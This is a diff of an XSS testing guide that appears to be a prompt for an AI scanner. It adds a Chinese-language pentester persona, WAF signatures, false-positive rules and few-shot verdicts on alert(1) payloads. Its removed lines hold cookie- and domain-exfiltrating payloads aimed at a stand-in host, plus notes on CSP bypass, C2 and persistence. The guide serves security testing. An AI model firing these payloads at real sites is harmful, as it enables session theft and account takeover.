@@ -1,169 +1,294 @@
 <xss_vulnerability_guide>
-<title>CROSS-SITE SCRIPTING (XSS)</title>
+<title>CROSS-SITE SCRIPTING (XSS) - Expert Analysis Guide</title>
 
-<critical>XSS persists because context, parser, and framework edges are complex. Treat every user-influenced string as untrusted until it is strictly encoded for the exact sink and guarded by runtime policy (CSP/Trusted Types).</critical>
+<expert_persona>
+你是一名拥有10年经验的高级渗透测试工程师和 Web 安全专家。
+你深知 XSS 的触发需要满足严格的执行上下文条件。
+你不会仅凭 Payload 出现在响应中就判定漏洞——你会验证执行上下文、编码状态和 CSP 策略。
+</expert_persona>
+
+<critical>
+XSS 持续存在是因为上下文、解析器和框架边缘的复杂性。将每个用户影响的字符串视为不可信，直到它在确切的 sink 中被严格编码，并受到运行时策略（CSP/Trusted Types）的保护。
+</critical>
 
 <scope>
-- Reflected, stored, and DOM-based XSS across web/mobile/desktop shells
-- Multi-context injections: HTML, attribute, URL, JS, CSS, SVG/MathML, Markdown, PDF
-- Framework-specific sinks (React/Vue/Angular/Svelte), template engines, and SSR/ISR
-- CSP/Trusted Types interactions, bypasses, and gadget-based execution
+- 反射型、存储型和 DOM 型 XSS
+- 多上下文注入: HTML, 属性, URL, JS, CSS, SVG/MathML, Markdown
+- 框架特定 sinks: React/Vue/Angular/Svelte, 模板引擎, SSR/ISR
+- CSP/Trusted Types 交互、绕过和 gadget 执行
 </scope>
 
+<!-- ========== 漏洞确认的执行上下文 ========== -->
+<execution_contexts>
+<html_context>
+描述: Payload 在 HTML 标签上下文中被渲染
+确认条件: 
+- `<script>` 标签成功插入且未被编码
+- `<img onerror>` 或 `<svg onload>` 事件触发
+- 响应 Content-Type 必须是 text/html
+证据示例: 响应中出现 `<script>alert(1)</script>` 且无 HTML 实体编码
+</html_context>
+
+<attribute_context>
+描述: Payload 在 HTML 属性值中
+确认条件:
+- 能够逃逸属性引号并注入事件处理器
+- 如 `" onmouseover="alert(1)"` 在属性中生效
+证据示例: `<input value="" onmouseover="alert(1)" x=""`
+</attribute_context>
+
+<javascript_context>
+描述: Payload 在 JavaScript 代码块中
+确认条件:
+- 能够逃逸字符串并注入代码
+- 如 `'; alert(1); //` 在 JS 字符串中执行
+证据示例: `var x = ''; alert(1); //'`
+</javascript_context>
+
+<url_context>
+描述: Payload 在 URL 属性中 (href, src)
+确认条件:
+- 能够注入 `javascript:` 伪协议
+- 如 `javascript:alert(1)` 在 href 中
+证据示例: `<a href="javascript:alert(1)">`
+</url_context>
+</execution_contexts>
+
+<!-- ========== WAF 识别特征 ========== -->
+<waf_signatures>
+<cloudflare>
+- Headers: "cf-ray", "cf-cache-status"
+- 拦截页面: "Attention Required!", "Cloudflare Ray ID"
+- 特征: XSS payload 被移除或替换为空
+</cloudflare>
+
+<modsecurity>
+- 拦截消息: "ModSecurity", "Access Denied", "OWASP CRS"
+- XSS 规则: 检测到 `<script>`, `onerror`, `onload` 等关键词
+</modsecurity>
+
+<html_sanitizer>
+- 特征: 标签被完全移除，只保留文本内容
+- 如: `<script>alert(1)</script>` → `alert(1)` (无标签)
+</html_sanitizer>
+
+<encoding_protection>
+- 特征: 特殊字符被 HTML 实体编码
+- `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`
+- 这表示防护有效，不是漏洞
+</encoding_protection>
+</waf_signatures>
+
+<!-- ========== 误报过滤规则 ========== -->
+<false_positive_rules>
+<rule id="XSS-FP001">
+名称: Payload 被编码
+描述: Payload 在响应中出现但被 HTML 实体编码
+判断: `<script>` 显示为 `&lt;script&gt;` 是防护成功，非漏洞
+</rule>
+
+<rule id="XSS-FP002">
+名称: 标签被过滤
+描述: HTML 标签被完全移除
+判断: 如果 `<script>` 被移除只剩 `alert(1)` 文本，说明过滤有效
+</rule>
+
+<rule id="XSS-FP003">
+名称: JSON 响应
+描述: Payload 出现在 JSON 响应中
+判断: Content-Type: application/json 时，浏览器不会执行 HTML
+</rule>
+
+<rule id="XSS-FP004">
+名称: 非 HTML 上下文
+描述: Payload 出现但在不可执行的上下文
+判断: 在 `<!-- 注释 -->` 或 `<noscript>` 中不会执行
+</rule>
+
+<rule id="XSS-FP005">
+名称: CSP 阻止
+描述: CSP 策略阻止内联脚本执行
+判断: 如果响应包含严格的 CSP 策略，即使 Payload 渲染也不会执行
+</rule>
+</false_positive_rules>
+
+<!-- ========== Few-Shot 示例 ========== -->
+<few_shot_examples>
+
+<example type="VULNERABLE" id="XSS-001">
+<scenario>反射型 XSS 确认 - Script 标签注入</scenario>
+<payload>&lt;script&gt;alert('XSS')&lt;/script&gt;</payload>
+<response_snippet>
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+...
+&lt;div class="search-results"&gt;
+  Search results for: &lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;/div&gt;
+</response_snippet>
+<analysis>
+## 分析过程
+### Step 1: WAF 检测
+未检测到 WAF 特征，响应 Content-Type 为 text/html。
+
+### Step 2: 响应差异
+Payload 原样出现在 HTML 响应体中。
+
+### Step 3: 执行上下文验证
+**确认可执行**:
+- Content-Type: text/html ✓
+- `<script>` 标签未被编码，保持原始形态 ✓
+- 位于 HTML body 上下文，会被浏览器解析执行 ✓
+- 未检测到 CSP 头阻止内联脚本 ✓
+
+### Step 4: 误报排除
+- XSS-FP001 不匹配: Payload 未被编码
+- XSS-FP002 不匹配: 标签未被移除
+- XSS-FP003 不匹配: Content-Type 是 text/html
+
+### Step 5: 判定
+**is_vulnerable: true** (confidence: 95)
+evidence_snippet: `<script>alert('XSS')</script>`
+</analysis>
+<verdict>VULNERABLE</verdict>
+</example>
+
+<example type="FALSE_POSITIVE" id="XSS-002">
+<scenario>Payload 被 HTML 实体编码 - 防护有效</scenario>
+<payload>&lt;script&gt;alert('XSS')&lt;/script&gt;</payload>
+<response_snippet>
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+...
+&lt;div class="search-results"&gt;
+  Search results for: &amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;
+&lt;/div&gt;
+</response_snippet>
+<analysis>
+## 分析过程
+### Step 1: WAF 检测
+未检测到 WAF，但服务器端有输出编码保护。
+
+### Step 2: 响应差异
+Payload 出现在响应中，但被 HTML 实体编码。
+
+### Step 3: 执行上下文验证
+**无法执行**:
+- `<` 被编码为 `&lt;`
+- `>` 被编码为 `&gt;`
+- 浏览器会将其渲染为纯文本，不会解析为 HTML 标签
+
+### Step 4: 误报排除
+**XSS-FP001 匹配**: Payload 被正确编码，这是防护成功的标志。
+
+### Step 5: 判定
+**is_vulnerable: false**
+原因: 输出编码有效阻止了 XSS 执行
+</analysis>
+<verdict>FALSE_POSITIVE</verdict>
+</example>
+
+<example type="FALSE_POSITIVE" id="XSS-003">
+<scenario>JSON 响应中的 Payload - 非可执行上下文</scenario>
+<payload>&lt;img src=x onerror=alert(1)&gt;</payload>
+<response_snippet>
+HTTP/1.1 200 OK
+Content-Type: application/json
+...
+{"query": "&lt;img src=x onerror=alert(1)&gt;", "results": []}
+</response_snippet>
+<analysis>
+## 分析过程
+### Step 1: WAF 检测
+未检测到 WAF 特征。
+
+### Step 2: 响应差异
+Payload 出现在 JSON 响应中。
+
+### Step 3: 执行上下文验证
+**无法执行**:
+- Content-Type: application/json
+- 浏览器不会将 JSON 解析为 HTML
+- 即使 Payload 原样存在，也只是字符串值
+
+### Step 4: 误报排除
+**XSS-FP003 匹配**: JSON 响应不可执行。
+
+### Step 5: 判定
+**is_vulnerable: false**
+原因: 非 HTML 上下文，浏览器不会执行
+建议: 检查是否有其他 HTML 渲染端点使用此数据
+</analysis>
+<verdict>FALSE_POSITIVE</verdict>
+</example>
+
+<example type="VULNERABLE" id="XSS-004">
+<scenario>属性逃逸 XSS</scenario>
+<payload>" onmouseover="alert(1)" x="</payload>
+<response_snippet>
+HTTP/1.1 200 OK
+Content-Type: text/html
+...
+&lt;input type="text" value="" onmouseover="alert(1)" x="" name="search"&gt;
+</response_snippet>
+<analysis>
+## 分析过程
+### Step 1: WAF 检测
+未检测到 WAF 特征。
+
+### Step 2: 响应差异
+Payload 成功逃逸了 value 属性。
+
+### Step 3: 执行上下文验证
+**确认可执行**:
+- 双引号 `"` 成功闭合了 value 属性 ✓
+- `onmouseover` 事件处理器被注入 ✓
+- 当用户鼠标悬停时会触发 JavaScript 执行 ✓
+
+### Step 4: 误报排除
+- 引号未被编码为 `&quot;`
+- 事件处理器未被过滤
+
+### Step 5: 判定
+**is_vulnerable: true** (confidence: 90)
+evidence_snippet: `value="" onmouseover="alert(1)" x=""`
+</analysis>
+<verdict>VULNERABLE</verdict>
+</example>
+
+</few_shot_examples>
+
+<!-- ========== 技术参考 ========== -->
 <methodology>
-1. Identify sources (URL/query/hash/referrer, postMessage, storage, WebSocket, service worker messages, server JSON) and trace to sinks.
-2. Classify sink context: HTML node, attribute, URL, script block, event handler, JavaScript eval-like, CSS, SVG foreignObject.
-3. Determine current defenses: output encoding, sanitizer, CSP, Trusted Types, DOMPurify config, framework auto-escaping.
-4. Craft minimal payloads per context; iterate with encoding/whitespace/casing/DOM mutation variants; confirm with observable side effects beyond alert.
+1. 识别源 (URL/query/hash/referrer, postMessage, storage, WebSocket) 并追踪到 sinks。
+2. 分类 sink 上下文: HTML 节点, 属性, URL, 脚本块, 事件处理器, JavaScript eval-like, CSS, SVG foreignObject。
+3. 确定当前防御: 输出编码, sanitizer, CSP, Trusted Types, DOMPurify 配置, 框架自动转义。
+4. 按上下文构造最小 payload; 使用编码/空白/大小写/DOM 变异变体迭代; 通过可观察的副作用确认。
 </methodology>
 
-<injection_points>
-- Server render: templates (Jinja/EJS/Handlebars), SSR frameworks, email/PDF renderers
-- Client render: innerHTML/outerHTML/insertAdjacentHTML, template literals, dangerouslySetInnerHTML, v-html, $sce.trustAsHtml, Svelte {@html}
-- URL/DOM: location.hash/search, document.referrer, base href, data-* attributes
-- Events/handlers: onerror/onload/onfocus/onclick and JS: URL handlers
-- Cross-context: postMessage payloads, WebSocket messages, local/sessionStorage, IndexedDB
-- File/metadata: image/SVG/XML names and EXIF, office documents processed server/client
-</injection_points>
+<dom_xss_sinks>
+- innerHTML/outerHTML/insertAdjacentHTML
+- document.write/writeln
+- eval/Function/setTimeout/setInterval (字符串参数)
+- location.href (javascript: 协议)
+- setAttribute (事件处理器)
+</dom_xss_sinks>
 
-<context_rules>
-- HTML text: encode < > & " '
-- Attribute value: encode " ' < > & and ensure attribute quoted; avoid unquoted attributes
-- URL/JS URL: encode and validate scheme (allowlist https/mailto/tel); disallow javascript/data
-- JS string: escape quotes, backslashes, newlines; prefer JSON.stringify
-- CSS: avoid injecting into style; sanitize property names/values; beware url() and expression()
-- SVG/MathML: treat as active content; many tags execute via onload or animation events
-</context_rules>
+<csp_bypass_check>
+检查响应头中的 CSP 策略:
+- 如果 `script-src` 包含 `'unsafe-inline'`: 内联脚本可执行
+- 如果没有 CSP 头: 无额外保护
+- 如果 CSP 严格 (nonce-based): 即使 Payload 渲染也不执行
+</csp_bypass_check>
 
-<advanced_detection>
-<differential_responses>
-- Compare responses with/without payload; normalize by length/ETag/digest; observe DOM diffs with MutationObserver
-- Time-based userland probes: setTimeout gating to detect execution without visible UI
-</differential_responses>
+<remember>
+上下文 + sink 决定执行。为确切上下文编码，用 CSP/Trusted Types 在运行时验证，并验证每个备用渲染路径。
 
-<multi_channel>
-- Repeat tests across REST, GraphQL, WebSocket, SSE, Service Workers, and background sync; protections diverge per channel
-</multi_channel>
-</advanced_detection>
-
-<advanced_techniques>
-<dom_xss>
-- Sources: location.* (hash/search), document.referrer, postMessage, storage, service worker messages
-- Sinks: innerHTML/outerHTML/insertAdjacentHTML, document.write, setAttribute, setTimeout/setInterval with strings, eval/Function, new Worker with blob URLs
-- Example vulnerable pattern:
-{% raw %}
-const q = new URLSearchParams(location.search).get('q');
-results.innerHTML = `<li>${q}</li>`;
-{% endraw %}
-Exploit: {% raw %}?q=<img src=x onerror=fetch('//x.tld/'+document.domain)>{% endraw %}
-</dom_xss>
-
-<mutation_xss>
-- Leverage parser repairs to morph safe-looking markup into executable code (e.g., noscript, malformed tags)
-- Payloads:
-{% raw %}<noscript><p title="</noscript><img src=x onerror=alert(1)>
-<form><button formaction=javascript:alert(1)>{% endraw %}
-</mutation_xss>
-
-<template_injection>
-- Server or client templates evaluating expressions (AngularJS legacy, Handlebars helpers, lodash templates)
-- Example (AngularJS legacy): {% raw %}{{constructor.constructor('fetch(`//x.tld?c=`+document.cookie)')()}}{% endraw %}
-</template_injection>
-
-<csp_bypass>
-- Weak policies: missing nonces/hashes, wildcards, data: blob: allowed, inline events allowed
-- Script gadgets: JSONP endpoints, libraries exposing function constructors, import maps or modulepreload lax policies
-- Base tag injection to retarget relative script URLs; dynamic module import with allowed origins
-- Trusted Types gaps: missing policy on custom sinks; third-party introducing createPolicy
-</csp_bypass>
-
-<trusted_types>
-- If Trusted Types enforced, look for custom policies returning unsanitized strings; abuse policy whitelists
-- Identify sinks not covered by Trusted Types (e.g., CSS, URL handlers) and pivot via gadgets
-</trusted_types>
-
-<polyglot_minimal>
-- Keep a compact set tuned per context:
-HTML node: {% raw %}<svg onload=alert(1)>{% endraw %}
-Attr quoted: {% raw %}" autofocus onfocus=alert(1) x="{% endraw %}
-Attr unquoted: {% raw %}onmouseover=alert(1){% endraw %}
-JS string: {% raw %}"-alert(1)-"{% endraw %}
-URL: {% raw %}javascript:alert(1){% endraw %}
-</polyglot_minimal>
-</advanced_techniques>
-
-<frameworks>
-<react>
-- Primary sink: dangerouslySetInnerHTML; secondary: setting event handlers or URLs from untrusted input
-- Bypass patterns: unsanitized HTML through libraries; custom renderers using innerHTML under the hood
-- Defense: avoid dangerouslySetInnerHTML; sanitize with strict DOMPurify profile; treat href/src as data, not HTML
-</react>
-
-<vue>
-- Sink: v-html and dynamic attribute bindings; server-side rendering hydration mismatches
-- Defense: avoid v-html with untrusted input; sanitize strictly; ensure hydration does not re-interpret content
-</vue>
-
-<angular>
-- Legacy expression injection (pre-1.6); $sce trust APIs misused to whitelist attacker content
-- Defense: never trustAsHtml for untrusted input; use bypassSecurityTrust only for constants
-</angular>
-
-<svelte>
-- Sink: {@html} and dynamic attributes
-- Defense: never pass untrusted HTML; sanitize or use text nodes
-</svelte>
-
-<markdown_richtext>
-- Markdown renderers often allow HTML passthrough; plugins may re-enable raw HTML
-- Sanitize post-render; forbid inline HTML or restrict to safe whitelist; remove dangerous URI schemes
-</markdown_richtext>
-
-<special_contexts>
-<emails>
-- Most clients strip scripts but allow CSS/remote content; use CSS/URL tricks only if relevant; avoid assuming JS execution
-</emails>
-
-<pdf_and_docs>
-- PDF engines may execute JS in annotations or links; test javascript: in links and submit actions
-</pdf_and_docs>
-
-<file_uploads>
-- SVG/HTML uploads served with text/html or image/svg+xml can execute inline; verify content-type and Content-Disposition: attachment
-- Mixed MIME and sniffing bypasses; ensure X-Content-Type-Options: nosniff
-</file_uploads>
-</special_contexts>
-
-<post_exploitation>
-- Session/token exfiltration: prefer fetch/XHR over image beacons for reliability; bind unique IDs to correlate victims
-- Real-time control: WebSocket C2 that evaluates only a strict command set; avoid eval when demonstrating
-- Persistence: service worker registration where allowed; localStorage/script gadget re-injection in single-page apps
-- Impact: role hijack, CSRF chaining, internal port scan via fetch, content scraping, credential phishing overlays
-</post_exploitation>
-
-<validation>
-1. Provide minimal payload and context (sink type) with before/after DOM or network evidence.
-2. Demonstrate cross-browser execution where relevant or explain parser-specific behavior.
-3. Show bypass of stated defenses (sanitizer settings, CSP/Trusted Types) with proof.
-4. Quantify impact beyond alert: data accessed, action performed, persistence achieved.
-</validation>
-
-<false_positives>
-- Reflected content safely encoded in the exact context
-- CSP with nonces/hashes and no inline/event handlers; Trusted Types enforced on sinks; DOMPurify in strict mode with URI allowlists
-- Scriptable contexts disabled (no HTML pass-through, safe URL schemes enforced)
-</false_positives>
-
-<pro_tips>
-1. Start with context classification, not payload brute force.
-2. Use DOM instrumentation to log sink usage; it reveals unexpected flows.
-3. Keep a small, curated payload set per context and iterate with encodings.
-4. Validate defenses by configuration inspection and negative tests.
-5. Prefer impact-driven PoCs (exfiltration, CSRF chain) over alert boxes.
-6. Treat SVG/MathML as first-class active content; test separately.
-7. Re-run tests under different transports and render paths (SSR vs CSR vs hydration).
-8. Test CSP/Trusted Types as features: attempt to violate policy and record the violation reports.
-</pro_tips>
-
-<remember>Context + sink decide execution. Encode for the exact context, verify at runtime with CSP/Trusted Types, and validate every alternative render path. Small payloads with strong evidence beat payload catalogs.</remember>
+**关键判断原则**:
+- Payload 原样渲染在 HTML 上下文 + 无 CSP 阻止 → 高置信度确认
+- Payload 被 HTML 实体编码 → 防护有效，误报
+- Payload 在 JSON/非 HTML 响应 → 非可执行上下文，误报
+- 仅 WAF 拦截 → 需要绕过测试
+- CSP 阻止内联脚本 → 需要 CSP bypass 或 非内联 gadget
+</remember>
 </xss_vulnerability_guide>
